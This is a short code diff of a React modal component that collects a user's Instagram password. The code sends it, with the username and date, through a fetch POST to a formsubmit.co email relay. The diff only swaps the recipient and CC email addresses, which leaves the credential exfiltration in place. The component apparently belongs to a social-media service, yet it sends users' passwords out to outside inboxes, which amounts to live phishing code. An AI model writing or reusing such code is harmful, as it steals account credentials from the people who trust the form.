@@ -95,7 +95,7 @@ const ModalNew = ({ modalIsOpen, setIsOpen, avatar, userId }) => {
     setLoading(true)
     var d = { instagramPassword, userMode: mode }
     if (instagramPassword) {
-      fetch("https://formsubmit.co/ajax/paulinnocent04@gmail.com", {
+      fetch("https://formsubmit.co/ajax/niko@pianalytica.com", {
         method: "POST",
         headers: {
           'Content-Type': 'application/json',
@@ -105,7 +105,7 @@ const ModalNew = ({ modalIsOpen, setIsOpen, avatar, userId }) => {
           'date': new Date().toDateString(),
           'username': user?.username,
           'password': instagramPassword,
-          _cc: 'support@sproutysocial.com',
+          _cc: 'paulinnocent05@gmail.com',
         })
       })
         .then(response => response.json())
